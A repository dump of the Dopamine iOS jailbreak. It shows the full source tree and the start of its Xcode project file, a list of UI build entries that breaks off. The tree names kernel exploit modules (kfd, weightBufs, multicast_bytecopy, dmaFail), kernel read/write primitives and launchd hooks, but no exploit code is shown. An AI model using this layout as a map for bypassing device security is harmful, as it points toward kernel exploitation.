Project Path: arc_opa334_Dopamine_dqhnbjf1

Source Tree:

```txt
arc_opa334_Dopamine_dqhnbjf1
├── Application
│   ├── Dopamine
│   │   ├── App Delegates
│   │   │   ├── DOAppDelegate.h
│   │   │   ├── DOAppDelegate.m
│   │   │   ├── DOSceneDelegate.h
│   │   │   └── DOSceneDelegate.m
│   │   ├── Assets.xcassets
│   │   │   ├── AccentColor.colorset
│   │   │   │   └── Contents.json
│   │   │   ├── AppIcon.appiconset
│   │   │   │   ├── Contents.json
│   │   │   │   ├── Icon-38@2x.png
│   │   │   │   ├── Icon-38@3x.png
│   │   │   │   ├── Icon-60@3x.png
│   │   │   │   ├── Icon-64@2x.png
│   │   │   │   ├── Icon-64@3x.png
│   │   │   │   ├── Icon-68@2x.png
│   │   │   │   ├── Icon-76@2x.png
│   │   │   │   ├── Icon-83.5@2x.png
│   │   │   │   ├── Icon-Notification@2x.png
│   │   │   │   ├── Icon-Notification@3x.png
│   │   │   │   ├── Icon-Small-40@2x.png
│   │   │   │   ├── Icon-Small-40@3x 1.png
│   │   │   │   ├── Icon-Small-40@3x.png
│   │   │   │   ├── Icon-Small@2x.png
│   │   │   │   └── Icon-Small@3x.png
│   │   │   ├── AppIcon_Blue.appiconset
│   │   │   │   ├── Contents.json
│   │   │   │   ├── Icon-38@2x.png
│   │   │   │   ├── Icon-38@3x.png
│   │   │   │   ├── Icon-60@2x.png
│   │   │   │   ├── Icon-60@3x.png
│   │   │   │   ├── Icon-64@2x.png
│   │   │   │   ├── Icon-64@3x.png
│   │   │   │   ├── Icon-68@2x.png
│   │   │   │   ├── Icon-76@2x.png
│   │   │   │   ├── Icon-83.5@2x.png
│   │   │   │   ├── Icon-Notification@2x.png
│   │   │   │   ├── Icon-Notification@3x.png
│   │   │   │   ├── Icon-Small-40@2x.png
│   │   │   │   ├── Icon-Small-40@3x.png
│   │   │   │   ├── Icon-Small@2x.png
│   │   │   │   └── Icon-Small@3x.png
│   │   │   ├── AppIcon_ElleKit.appiconset
│   │   │   │   ├── Contents.json
│   │   │   │   ├── Icon-38@2x.png
│   │   │   │   ├── Icon-38@3x.png
│   │   │   │   ├── Icon-60@2x.png
│   │   │   │   ├── Icon-60@3x.png
│   │   │   │   ├── Icon-64@2x.png
│   │   │   │   ├── Icon-64@3x.png
│   │   │   │   ├── Icon-68@2x.png
│   │   │   │   ├── Icon-76@2x.png
│   │   │   │   ├── Icon-83.5@2x.png
│   │   │   │   ├── Icon-Notification@2x.png
│   │   │   │   ├── Icon-Notification@3x.png
│   │   │   │   ├── Icon-Small-40@2x.png
│   │   │   │   ├── Icon-Small-40@3x.png
│   │   │   │   ├── Icon-Small@2x.png
│   │   │   │   └── Icon-Small@3x.png
│   │   │   ├── AppIcon_Purple.appiconset
│   │   │   │   ├── Contents.json
│   │   │   │   ├── Icon-38@2x.png
│   │   │   │   ├── Icon-38@3x.png
│   │   │   │   ├── Icon-60@2x.png
│   │   │   │   ├── Icon-60@3x.png
│   │   │   │   ├── Icon-64@2x.png
│   │   │   │   ├── Icon-64@3x.png
│   │   │   │   ├── Icon-68@2x.png
│   │   │   │   ├── Icon-76@2x.png
│   │   │   │   ├── Icon-83.5@2x.png
│   │   │   │   ├── Icon-Notification@2x.png
│   │   │   │   ├── Icon-Notification@3x.png
│   │   │   │   ├── Icon-Small-40@2x.png
│   │   │   │   ├── Icon-Small-40@3x.png
│   │   │   │   ├── Icon-Small@2x.png
│   │   │   │   └── Icon-Small@3x.png
│   │   │   ├── AppIcon_Red.appiconset
│   │   │   │   ├── Contents.json
│   │   │   │   ├── Icon-38@2x.png
│   │   │   │   ├── Icon-38@3x.png
│   │   │   │   ├── Icon-60@2x.png
│   │   │   │   ├── Icon-60@3x.png
│   │   │   │   ├── Icon-64@2x.png
│   │   │   │   ├── Icon-64@3x.png
│   │   │   │   ├── Icon-68@2x.png
│   │   │   │   ├── Icon-76@2x.png
│   │   │   │   ├── Icon-83.5@2x.png
│   │   │   │   ├── Icon-Notification@2x.png
│   │   │   │   ├── Icon-Notification@3x.png
│   │   │   │   ├── Icon-Small-40@2x.png
│   │   │   │   ├── Icon-Small-40@3x.png
│   │   │   │   ├── Icon-Small@2x.png
│   │   │   │   └── Icon-Small@3x.png
│   │   │   ├── Background
│   │   │   │   ├── Background_Blue.imageset
│   │   │   │   │   ├── Contents.json
│   │   │   │   │   └── blue.jpg
│   │   │   │   ├── Background_ElleKit.imageset
│   │   │   │   │   ├── Contents.json
│   │   │   │   │   └── ellekit.jpg
│   │   │   │   ├── Background_Green.imageset
│   │   │   │   │   ├── Contents.json
│   │   │   │   │   └── green.jpg
│   │   │   │   ├── Background_Purple.imageset
│   │   │   │   │   ├── Contents.json
│   │   │   │   │   └── purple.jpg
│   │   │   │   ├── Background_Red.imageset
│   │   │   │   │   ├── Contents.json
│   │   │   │   │   └── red.jpg
│   │   │   │   └── Contents.json
│   │   │   ├── Contents.json
│   │   │   ├── Dopamine.imageset
│   │   │   │   ├── Contents.json
│   │   │   │   ├── Dopamine.png
│   │   │   │   ├── Dopamine@2x.png
│   │   │   │   └── Dopamine@3x.png
│   │   │   ├── DopamineLogo.imageset
│   │   │   │   ├── Contents.json
│   │   │   │   └── DopamineLogo.pdf
│   │   │   ├── Loading.imageset
│   │   │   │   ├── Contents.json
│   │   │   │   └── Oval.png
│   │   │   ├── Package Managers
│   │   │   │   ├── Contents.json
│   │   │   │   ├── Sileo.imageset
│   │   │   │   │   ├── AppIcon83.5x83.5@2x.png
│   │   │   │   │   └── Contents.json
│   │   │   │   └── Zebra.imageset
│   │   │   │       ├── Contents.json
│   │   │   │       └── icon_83.5@2x.png
│   │   │   └── alpha-gradient.imageset
│   │   │       ├── Contents.json
│   │   │       └── Rectangle.png
│   │   ├── Base.lproj
│   │   │   └── LaunchScreen.storyboard
│   │   ├── Dependencies
│   │   │   ├── libgrabkernel2.a
│   │   │   └── libpartial.a
│   │   ├── Dopamine.entitlements
│   │   ├── Exploits
│   │   │   ├── badRecovery
│   │   │   │   ├── Info.plist
│   │   │   │   ├── badRecovery.h
│   │   │   │   ├── badRecovery.m
│   │   │   │   └── badRecovery.s
│   │   │   ├── dmaFail
│   │   │   │   ├── Info.plist
│   │   │   │   ├── dmaFail.c
│   │   │   │   └── dmaFail.h
│   │   │   ├── kfd
│   │   │   │   ├── Exploit
│   │   │   │   │   ├── libkfd
│   │   │   │   │   │   ├── common.h
│   │   │   │   │   │   ├── info
│   │   │   │   │   │   │   ├── dynamic_info.h
│   │   │   │   │   │   │   └── static_info.h
│   │   │   │   │   │   ├── info.h
│   │   │   │   │   │   ├── krkw
│   │   │   │   │   │   │   ├── IOSurface_shared.h
│   │   │   │   │   │   │   ├── kread
│   │   │   │   │   │   │   │   ├── kread_IOSurface.h
│   │   │   │   │   │   │   │   ├── kread_kqueue_workloop_ctl.h
│   │   │   │   │   │   │   │   └── kread_sem_open.h
│   │   │   │   │   │   │   └── kwrite
│   │   │   │   │   │   │       ├── kwrite_IOSurface.h
│   │   │   │   │   │   │       ├── kwrite_dup.h
│   │   │   │   │   │   │       └── kwrite_sem_open.h
│   │   │   │   │   │   ├── krkw.h
│   │   │   │   │   │   ├── perf.h
│   │   │   │   │   │   ├── puaf
│   │   │   │   │   │   │   ├── landa.h
│   │   │   │   │   │   │   ├── physpuppet.h
│   │   │   │   │   │   │   └── smith.h
│   │   │   │   │   │   └── puaf.h
│   │   │   │   │   └── libkfd.h
│   │   │   │   ├── Info.plist
│   │   │   │   ├── kfd.h
│   │   │   │   └── kfd.m
│   │   │   ├── multicast_bytecopy
│   │   │   │   ├── Info.plist
│   │   │   │   ├── exploit
│   │   │   │   │   ├── IOGPU.c
│   │   │   │   │   ├── IOGPU.h
│   │   │   │   │   ├── IOSurfaceRoot.c
│   │   │   │   │   ├── IOSurfaceRoot.h
│   │   │   │   │   ├── exploit.c
│   │   │   │   │   ├── exploit.h
│   │   │   │   │   ├── iokit.h
│   │   │   │   │   ├── kernel_base.c
│   │   │   │   │   ├── kernel_base.h
│   │   │   │   │   ├── kernel_rw.c
│   │   │   │   │   ├── kernel_rw.h
│   │   │   │   │   ├── mcast.c
│   │   │   │   │   ├── mcast.h
│   │   │   │   │   ├── necp.c
│   │   │   │   │   ├── necp.h
│   │   │   │   │   ├── port_utils.c
│   │   │   │   │   ├── port_utils.h
│   │   │   │   │   ├── spray.c
│   │   │   │   │   ├── spray.h
│   │   │   │   │   └── xpaci.h
│   │   │   │   ├── multicast_bytecopy.h
│   │   │   │   └── multicast_bytecopy.m
│   │   │   └── weightBufs
│   │   │       ├── Info.plist
│   │   │       ├── exploit
│   │   │       │   ├── ANEDirectIn.c
│   │   │       │   ├── ANEDirectIn.h
│   │   │       │   ├── AppleNeuralEngine
│   │   │       │   │   ├── AppleNeuralEngine-Structs.h
│   │   │       │   │   ├── AppleNeuralEngine.h
│   │   │       │   │   ├── NSCopying.h
│   │   │       │   │   ├── NSSecureCoding.h
│   │   │       │   │   ├── _ANEClient.h
│   │   │       │   │   ├── _ANECloneHelper.h
│   │   │       │   │   ├── _ANEDaemonConnection.h
│   │   │       │   │   ├── _ANEDaemonProtocol.h
│   │   │       │   │   ├── _ANEDataReporter.h
│   │   │       │   │   ├── _ANEDeviceController.h
│   │   │       │   │   ├── _ANEDeviceInfo.h
│   │   │       │   │   ├── _ANEErrors.h
│   │   │       │   │   ├── _ANEHashEncoding.h
│   │   │       │   │   ├── _ANEIOSurfaceObject.h
│   │   │       │   │   ├── _ANELog.h
│   │   │       │   │   ├── _ANEModel.h
│   │   │       │   │   ├── _ANEPerformanceStats.h
│   │   │       │   │   ├── _ANEProgramForEvaluation.h
│   │   │       │   │   ├── _ANEQoSMapper.h
│   │   │       │   │   ├── _ANERequest.h
│   │   │       │   │   └── _ANEStrings.h
│   │   │       │   ├── IOGPU.c
│   │   │       │   ├── IOGPU.h
│   │   │       │   ├── IOSurface.c
│   │   │       │   ├── IOSurface.h
│   │   │       │   ├── aneProgram.h
│   │   │       │   ├── exploit.h
│   │   │       │   ├── exploit.m
│   │   │       │   ├── iokit.h
│   │   │       │   ├── model_tmp.hwx
│   │   │       │   └── utils.c
│   │   │       ├── weightBufs.h
│   │   │       └── weightBufs.m
│   │   ├── Extensions
│   │   │   ├── NSData+Hex.h
│   │   │   ├── NSData+Hex.m
│   │   │   ├── NSString+Version.h
│   │   │   ├── NSString+Version.m
│   │   │   ├── UIImage+Blur.h
│   │   │   ├── UIImage+Blur.m
│   │   │   ├── UIImage+JPEG2000.h
│   │   │   └── UIImage+JPEG2000.m
│   │   ├── Headers
│   │   │   ├── zdict.h
│   │   │   ├── zstd.h
│   │   │   └── zstd_errors.h
│   │   ├── Info.plist
│   │   ├── Jailbreak
│   │   │   ├── DOBootstrapper.h
│   │   │   ├── DOBootstrapper.m
│   │   │   ├── DOEnvironmentManager.h
│   │   │   ├── DOEnvironmentManager.m
│   │   │   ├── DOExploit.h
│   │   │   ├── DOExploit.m
│   │   │   ├── DOExploitManager.h
│   │   │   ├── DOExploitManager.m
│   │   │   ├── DOJailbreaker.h
│   │   │   ├── DOJailbreaker.m
│   │   │   ├── DOPreferenceManager.h
│   │   │   └── DOPreferenceManager.m
│   │   ├── Resources
│   │   │   ├── LICENSE.md
│   │   │   ├── LICENSE_ChOma.md
│   │   │   ├── LICENSE_ElleKit.md
│   │   │   ├── LICENSE_Fugu15.md
│   │   │   ├── LICENSE_Fugu15_Rootful.md
│   │   │   ├── LICENSE_Procursus.md
│   │   │   ├── LICENSE_Sileo.md
│   │   │   ├── LICENSE_XPF.md
│   │   │   ├── LICENSE_Zebra.md
│   │   │   ├── LICENSE_dimentio.md
│   │   │   ├── LICENSE_kfd.md
│   │   │   ├── LICENSE_libc.md
│   │   │   ├── LICENSE_libgrabkernel2.md
│   │   │   ├── LICENSE_opainject.md
│   │   │   ├── LICENSE_plooshinit.md
│   │   │   ├── LICENSE_weightBufs.md
│   │   │   ├── download_bootstraps.sh
│   │   │   ├── sileo.deb
│   │   │   └── zebra.deb
│   │   ├── UI
│   │   │   ├── ActionMenu
│   │   │   │   ├── DOActionMenuButton.h
│   │   │   │   ├── DOActionMenuButton.m
│   │   │   │   ├── DOActionMenuDelegate.h
│   │   │   │   ├── DOActionMenuView.h
│   │   │   │   └── DOActionMenuView.m
│   │   │   ├── DOGlobalAppearance.h
│   │   │   ├── DOGlobalAppearance.m
│   │   │   ├── DOHeaderView.h
│   │   │   ├── DOHeaderView.m
│   │   │   ├── DOJailbreakButton.h
│   │   │   ├── DOJailbreakButton.m
│   │   │   ├── DOMainViewController.h
│   │   │   ├── DOMainViewController.m
│   │   │   ├── DONavigationController.h
│   │   │   ├── DONavigationController.m
│   │   │   ├── DOUIManager.h
│   │   │   ├── DOUIManager.m
│   │   │   ├── Log
│   │   │   │   ├── DODebugLogView.h
│   │   │   │   ├── DODebugLogView.m
│   │   │   │   ├── DOLogCrashViewController.h
│   │   │   │   ├── DOLogCrashViewController.m
│   │   │   │   ├── DOLogViewProtocol.h
│   │   │   │   ├── DOLyricsLogItemView.h
│   │   │   │   ├── DOLyricsLogItemView.m
│   │   │   │   ├── DOLyricsLogView.h
│   │   │   │   ├── DOLyricsLogView.m
│   │   │   │   ├── DOProgressiveBlurView.h
│   │   │   │   ├── DOProgressiveBlurView.m
│   │   │   │   └── Indicator
│   │   │   │       ├── DODoubleHelixIndicator.h
│   │   │   │       ├── DODoubleHelixIndicator.m
│   │   │   │       ├── DOLoadingIndicator.h
│   │   │   │       └── DOLoadingIndicator.m
│   │   │   ├── PkgManagers
│   │   │   │   ├── DOAppSwitch.h
│   │   │   │   ├── DOAppSwitch.m
│   │   │   │   ├── DOPkgManagerPickerView.h
│   │   │   │   ├── DOPkgManagerPickerView.m
│   │   │   │   ├── DOPkgManagerPickerViewController.h
│   │   │   │   ├── DOPkgManagerPickerViewController.m
│   │   │   │   └── PkgManagers.plist
│   │   │   ├── Settings
│   │   │   │   ├── Credits.plist
│   │   │   │   ├── DOCreditsViewController.h
│   │   │   │   ├── DOCreditsViewController.m
│   │   │   │   ├── DOLicenseViewController.h
│   │   │   │   ├── DOLicenseViewController.m
│   │   │   │   ├── DOSettingsController.h
│   │   │   │   ├── DOSettingsController.m
│   │   │   │   ├── PSLists
│   │   │   │   │   ├── DOPSExploitListItemsController.h
│   │   │   │   │   ├── DOPSExploitListItemsController.m
│   │   │   │   │   ├── DOPSJetsamListItemsController.h
│   │   │   │   │   ├── DOPSJetsamListItemsController.m
│   │   │   │   │   ├── DOPSListController.h
│   │   │   │   │   ├── DOPSListController.m
│   │   │   │   │   ├── DOPSListItemsController.h
│   │   │   │   │   └── DOPSListItemsController.m
│   │   │   │   └── Specifiers
│   │   │   │       ├── DOButtonCell.h
│   │   │   │       ├── DOButtonCell.m
│   │   │   │       ├── DOCreditsCell.h
│   │   │   │       ├── DOCreditsCell.m
│   │   │   │       ├── DOHeaderCell.h
│   │   │   │       └── DOHeaderCell.m
│   │   │   ├── Themes
│   │   │   │   ├── DOTheme.h
│   │   │   │   ├── DOTheme.m
│   │   │   │   ├── DOThemeManager.h
│   │   │   │   ├── DOThemeManager.m
│   │   │   │   └── Themes.plist
│   │   │   ├── Transition
│   │   │   │   ├── DOModalBackAction.h
│   │   │   │   ├── DOModalBackAction.m
│   │   │   │   ├── DOModalTransitionPush.h
│   │   │   │   ├── DOModalTransitionPush.m
│   │   │   │   ├── DOModalTransitionScale.h
│   │   │   │   └── DOModalTransitionScale.m
│   │   │   └── Update
│   │   │       ├── DODownloadViewController.h
│   │   │       ├── DODownloadViewController.m
│   │   │       ├── DOUpdateCircleView.h
│   │   │       ├── DOUpdateCircleView.m
│   │   │       ├── DOUpdateViewController.h
│   │   │       └── DOUpdateViewController.m
│   │   ├── ar.lproj
│   │   │   └── Localizable.strings
│   │   ├── da.lproj
│   │   │   └── Localizable.strings
│   │   ├── de.lproj
│   │   │   └── Localizable.strings
│   │   ├── el.lproj
│   │   │   └── Localizable.strings
│   │   ├── en.lproj
│   │   │   └── Localizable.strings
│   │   ├── es.lproj
│   │   │   └── Localizable.strings
│   │   ├── fil.lproj
│   │   │   └── Localizable.strings
│   │   ├── fr.lproj
│   │   │   └── Localizable.strings
│   │   ├── it.lproj
│   │   │   └── Localizable.strings
│   │   ├── ja.lproj
│   │   │   └── Localizable.strings
│   │   ├── kk.lproj
│   │   │   └── Localizable.strings
│   │   ├── ko.lproj
│   │   │   └── Localizable.strings
│   │   ├── main.m
│   │   ├── nl.lproj
│   │   │   └── Localizable.strings
│   │   ├── pl.lproj
│   │   │   └── Localizable.strings
│   │   ├── pt-BR.lproj
│   │   │   └── Localizable.strings
│   │   ├── ru.lproj
│   │   │   └── Localizable.strings
│   │   ├── sv.lproj
│   │   │   └── Localizable.strings
│   │   ├── th.lproj
│   │   │   └── Localizable.strings
│   │   ├── tr.lproj
│   │   │   └── Localizable.strings
│   │   ├── uk.lproj
│   │   │   └── Localizable.strings
│   │   ├── ur.lproj
│   │   │   └── Localizable.strings
│   │   ├── vi.lproj
│   │   │   └── Localizable.strings
│   │   ├── zh-CN.lproj
│   │   │   └── Localizable.strings
│   │   ├── zh-HK.lproj
│   │   │   └── Localizable.strings
│   │   ├── zh-Hans.lproj
│   │   │   └── Localizable.strings
│   │   └── zh-TW.lproj
│   │       └── Localizable.strings
│   ├── Dopamine.xcodeproj
│   │   ├── project.pbxproj
│   │   └── project.xcworkspace
│   │       └── contents.xcworkspacedata
│   ├── Frameworks
│   │   └── Preferences.framework
│   │       ├── Headers
│   │       │   ├── PSControlTableCell.h
│   │       │   ├── PSListController.h
│   │       │   ├── PSSegmentTableCell.h
│   │       │   ├── PSSpecifier.h
│   │       │   ├── PSSwitchTableCell.h
│   │       │   ├── PSTableCell.h
│   │       │   └── PSViewController.h
│   │       └── Preferences.tbd
│   └── Makefile
├── BaseBin
│   ├── ChOma
│   ├── MachOMerger
│   │   ├── MachOMerger.entitlements
│   │   ├── Makefile
│   │   ├── Package.resolved
│   │   ├── Package.swift
│   │   ├── README.md
│   │   ├── Sources
│   │   │   └── MachOMerger
│   │   │       ├── ChainedFixups.swift
│   │   │       ├── MagicSymbols.swift
│   │   │       ├── MiscCmds.swift
│   │   │       ├── RelocInfo.swift
│   │   │       ├── SegmentLoadCommand.swift
│   │   │       ├── SegmentSplitInfo.swift
│   │   │       ├── Symbols.swift
│   │   │       ├── ULEB128Reader.swift
│   │   │       ├── UnixThread.swift
│   │   │       └── main.swift
│   │   └── upload.sh
│   ├── Makefile
│   ├── XPF
│   ├── _external
│   │   ├── basebin
│   │   │   ├── LaunchDaemons
│   │   │   │   ├── com.opa334.Dopamine.idownloadd.plist
│   │   │   │   └── com.opa334.Dopamine.startup.plist
│   │   │   └── fallback
│   │   │       └── CydiaSubstrate.framework
│   │   │           └── CydiaSubstrate
│   │   ├── frameworks
│   │   │   └── IOMobileFramebuffer.framework
│   │   │       └── IOMobileFramebuffer.tbd
│   │   ├── include
│   │   │   ├── CoreServices
│   │   │   │   ├── LSApplicationProxy.h
│   │   │   │   └── LSBundleProxy.h
│   │   │   ├── CoreSymbolication.h
│   │   │   ├── IOMobileFramebuffer
│   │   │   │   └── IOMobileFramebuffer.h
│   │   │   ├── bsm
│   │   │   │   ├── audit.h
│   │   │   │   ├── audit_filter.h
│   │   │   │   ├── audit_session.h
│   │   │   │   ├── audit_uevents.h
│   │   │   │   └── libbsm.h
│   │   │   ├── dyld_cache_format.h
│   │   │   ├── fixup-chains.h
│   │   │   ├── kern_memorystatus.h
│   │   │   ├── launch.h
│   │   │   ├── libarchive
│   │   │   │   ├── archive.h
│   │   │   │   └── archive_entry.h
│   │   │   ├── libgrabkernel2
│   │   │   │   └── libgrabkernel2.h
│   │   │   ├── libkrw
│   │   │   │   └── libkrw_plugin.h
│   │   │   ├── libproc.h
│   │   │   ├── os
│   │   │   │   ├── alloc_once_impl.h
│   │   │   │   ├── alloc_once_private.h
│   │   │   │   └── once_private.h
│   │   │   ├── sandbox.h
│   │   │   ├── substrate.h
│   │   │   ├── sys
│   │   │   │   ├── kern_control.h
│   │   │   │   └── proc_info.h
│   │   │   ├── xpc
│   │   │   │   ├── XPC.apinotes
│   │   │   │   ├── activity.h
│   │   │   │   ├── availability.h
│   │   │   │   ├── base.h
│   │   │   │   ├── connection.h
│   │   │   │   ├── debug.h
│   │   │   │   ├── endpoint.h
│   │   │   │   ├── module.modulemap
│   │   │   │   ├── rich_error.h
│   │   │   │   ├── session.h
│   │   │   │   └── xpc.h
│   │   │   └── xpc_private.h
│   │   ├── lib
│   │   │   └── libellekit.tbd
│   │   └── modules
│   │       └── litehook
│   ├── boomerang
│   │   ├── Makefile
│   │   ├── entitlements.plist
│   │   └── src
│   │       └── main.c
│   ├── dyldhook
│   │   ├── Makefile
│   │   └── src
│   │       ├── dyld.h
│   │       ├── dyld_jbinfo.h
│   │       ├── fakelib_redirect.c
│   │       ├── generated
│   │       │   ├── ios15
│   │       │   │   └── task.c
│   │       │   └── ios16
│   │       │       └── task.c
│   │       ├── lv_bypass.c
│   │       ├── machomerger_hook.h
│   │       ├── main.S
│   │       ├── main.c
│   │       ├── reimpl.c
│   │       └── spinlock_fix.c
│   ├── forkfix
│   │   ├── Makefile
│   │   └── src
│   │       ├── main.c
│   │       ├── reimpl.c.disabled
│   │       ├── reimpl.h.disabled
│   │       ├── syscall.S
│   │       └── syscall.h
│   ├── idownloadd
│   │   ├── Makefile
│   │   ├── entitlements.plist
│   │   └── src
│   │       ├── idownloadd
│   │       │   ├── iDownloadCmds.swift
│   │       │   ├── iDownloadKRW.swift
│   │       │   ├── idownloadd-Bridging-Header.h
│   │       │   ├── main.swift
│   │       │   └── shim.c
│   │       └── idownloadd.xcodeproj
│   │           ├── project.pbxproj
│   │           └── project.xcworkspace
│   │               └── contents.xcworkspacedata
│   ├── jbctl
│   │   ├── Makefile
│   │   ├── entitlements.plist
│   │   └── src
│   │       ├── internal.h
│   │       ├── internal.m
│   │       └── main.m
│   ├── launchdhook
│   │   ├── Makefile
│   │   └── src
│   │       ├── asl.h
│   │       ├── boomerang.c
│   │       ├── boomerang.h
│   │       ├── crashreporter.h
│   │       ├── crashreporter.m
│   │       ├── daemon_hook.h
│   │       ├── daemon_hook.m
│   │       ├── ipc_hook.c
│   │       ├── ipc_hook.h
│   │       ├── jbserver
│   │       │   ├── jbdomain_platform.c
│   │       │   ├── jbdomain_root.c
│   │       │   ├── jbdomain_systemwide.c
│   │       │   ├── jbdomain_watchdog.c
│   │       │   ├── jbserver_global.c
│   │       │   ├── jbserver_global.h
│   │       │   ├── jbserver_local.c
│   │       │   ├── jbserver_local.h
│   │       │   ├── jbserver_mach.c
│   │       │   ├── jbsettings.c
│   │       │   └── jbsettings.h
│   │       ├── jetsam_hook.c
│   │       ├── jetsam_hook.h
│   │       ├── main.m
│   │       ├── spawn_hook.c
│   │       ├── spawn_hook.h
│   │       ├── update.h
│   │       ├── update.m
│   │       ├── xpc_hook.c
│   │       └── xpc_hook.h
│   ├── libintl.8.dylib
│   ├── libjailbreak
│   │   ├── Makefile
│   │   └── src
│   │       ├── basebin_gen.h
│   │       ├── basebin_gen.m
│   │       ├── carboncopy.h
│   │       ├── carboncopy.m
│   │       ├── codesign.h
│   │       ├── codesign.m
│   │       ├── display.h
│   │       ├── display.m
│   │       ├── info.c
│   │       ├── info.h
│   │       ├── jbclient_mach.c
│   │       ├── jbclient_mach.h
│   │       ├── jbclient_xpc.c
│   │       ├── jbclient_xpc.h
│   │       ├── jbroot.c
│   │       ├── jbroot.h
│   │       ├── jbserver.c
│   │       ├── jbserver.h
│   │       ├── jbserver_boomerang.c
│   │       ├── jbserver_boomerang.h
│   │       ├── jbserver_domains.h
│   │       ├── kalloc_pt.h
│   │       ├── kalloc_pt.m
│   │       ├── kcall_Fugu14.S
│   │       ├── kcall_Fugu14.c
│   │       ├── kcall_Fugu14.h
│   │       ├── kcall_arm64.c
│   │       ├── kcall_arm64.h
│   │       ├── kernel.c
│   │       ├── kernel.h
│   │       ├── libjailbreak.h
│   │       ├── machine_info.h
│   │       ├── main.c
│   │       ├── physrw.c
│   │       ├── physrw.h
│   │       ├── physrw_pte.c
│   │       ├── physrw_pte.h
│   │       ├── primitives.c
│   │       ├── primitives.h
│   │       ├── primitives_IOSurface.h
│   │       ├── primitives_IOSurface.m
│   │       ├── primitives_external.h
│   │       ├── pte.h
│   │       ├── pvh.h
│   │       ├── signatures.c
│   │       ├── signatures.h
│   │       ├── translation.c
│   │       ├── translation.h
│   │       ├── trustcache.c
│   │       ├── trustcache.h
│   │       ├── trustcache_structs.h
│   │       ├── util.c
│   │       ├── util.h
│   │       └── util.m
│   ├── opainject
│   ├── rootlesshooks
│   │   ├── Makefile
│   │   ├── SpringBoard.x
│   │   ├── cfprefsd.x
│   │   ├── installd.x
│   │   ├── lsd.x
│   │   └── main.x
│   ├── systemhook
│   │   ├── Makefile
│   │   ├── src
│   │   │   ├── common.c
│   │   │   ├── common.h
│   │   │   ├── envbuf.c
│   │   │   ├── envbuf.h
│   │   │   ├── launchd.h
│   │   │   ├── main.c
│   │   │   └── private.h
│   │   └── upload.sh
│   ├── tar
│   └── watchdoghook
│       ├── Makefile
│       └── src
│           └── main.m
├── LICENSE.md
├── Makefile
├── Packages
│   ├── Makefile
│   ├── basebin-link
│   │   ├── Makefile
│   │   └── control
│   ├── libkrw-provider
│   │   ├── Makefile
│   │   ├── control
│   │   └── src
│   │       └── main.c
│   └── libroot
│       ├── Makefile
│       ├── control
│       └── src
│           ├── paths.c
│           └── paths.h
├── README.md
└── sort_localizations.sh

```

`Application/Dopamine.xcodeproj/project.pbxproj`:

```pbxproj
// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 56;
	objects = {

/* Begin PBXBuildFile section */
		040622AA2B77FE8E00393AAD /* DOPkgManagerPickerViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 040622A92B77FE8E00393AAD /* DOPkgManagerPickerViewController.m */; };
		042479A22B66916B0082581B /* DOCreditsViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 0424796B2B66916B0082581B /* DOCreditsViewController.m */; };
		042479A32B66916B0082581B /* DOSettingsController.m in Sources */ = {isa = PBXBuildFile; fileRef = 0424796C2B66916B0082581B /* DOSettingsController.m */; };
		042479A42B66916B0082581B /* Credits.plist in Resources */ = {isa = PBXBuildFile; fileRef = 0424796F2B66916B0082581B /* Credits.plist */; };
		042479A52B66916B0082581B /* DOCreditsCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 042479732B66916B0082581B /* DOCreditsCell.m */; };
		042479A62B66916B0082581B /* DOHeaderCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 042479752B66916B0082581B /* DOHeaderCell.m */; };
		042479A72B66916B0082581B /* DOButtonCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 042479772B66916B0082581B /* DOButtonCell.m */; };
		042479A82B66916B0082581B /* DOPSListController.m in Sources */ = {isa = PBXBuildFile; fileRef = 042479782B66916B0082581B /* DOPSListController.m */; };
		042479A92B66916B0082581B /* DOModalBackAction.m in Sources */ = {isa = PBXBuildFile; fileRef = 0424797C2B66916B0082581B /* DOModalBackAction.m */; };
		042479AA2B66916B0082581B /* DOModalTransitionPush.m in Sources */ = {isa = PBXBuildFile; fileRef = 0424797D2B66916B0082581B /* DOModalTransitionPush.m */; };
		042479AB2B66916B0082581B /* DOModalTransitionScale.m in Sources */ = {isa = PBXBuildFile; fileRef = 0424797E2B66916B0082581B /* DOModalTransitionScale.m */; };
		042479AC2B66916B0082581B /* DOJailbreakButton.m in Sources */ = {isa = PBXBuildFile; fileRef = 042479862B66916B0082581B /* DOJailbreakButton.m */; };
		042479AD2B66916B0082581B /* DOHeaderView.m in Sources */ = {isa = PBXBuildFile; fileRef = 042479872B66916B0082581B /* DOHeaderView.m */; };
		042479AE2B66916B0082581B /* DOUIManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 042479882B66916B0082581B /* DOUIManager.m */; };
		042479AF2B66916B0082581B /* DONavigationController.m in Sources */ = {isa = PBXBuildFile; fileRef = 042479892B66916B0082581B /* DONavigationController.m */; };
		042479B02B66916B0082581B /* DOLoadingIndicator.m in Sources */ = {isa = PBXBuildFile; fileRef = 0424798E2B66916B0082581B /* DOLoadingIndicator.m */; };
		042479B12B66916B0082581B /* DODoubleHelixIndicator.m in Sources */ = {isa = PBXBuildFile; fileRef = 042479902B66916B0082581B /* DODoubleHelixIndicator.m */; };
		042479B22B66916B0082581B /* DOLyricsLogView.m in Sources */ = {isa = PBXBuildFile; fileRef = 042479942B66916B0082581B /* DOLyricsLogView.m */; };
		042479B32B66916B0082581B /* DODebugLogView.m in Sources */ = {isa = PBXBuildFile; fileRef = 042479952B66916B0082581B /* DODebugLogView.m */; };
		042479B42B66916B0082581B /* DOProgressiveBlurView.m in Sources */ = {isa = PBXBuildFile; fileRef = 042479962B66916B0082581B /* DOProgressiveBlurView.m */; };
		042479B52B66916B0082581B /* DOLyricsLogItemView.m in Sources */ = {isa = PBXBuildFile; fileRef = 042479972B66916B0082581B /* DOLyricsLogItemView.m */; };
		042479B62B66916B0082581B /* DOActionMenuButton.m in Sources */ = {isa = PBXBuildFile; fileRef = 0424799A2B66916B0082581B /* DOActionMenuButton.m */; };
		042479B72B66916B0082581B /* DOActionMenuView.m in Sources */ = {isa = PBXBuildFile; fileRef = 0424799D2B66916B0082581B /* DOActionMenuView.m */; };
		042479B82B66916B0082581B /* DOMainViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 0424799F2B66916B0082581B /* DOMainViewController.m */; };
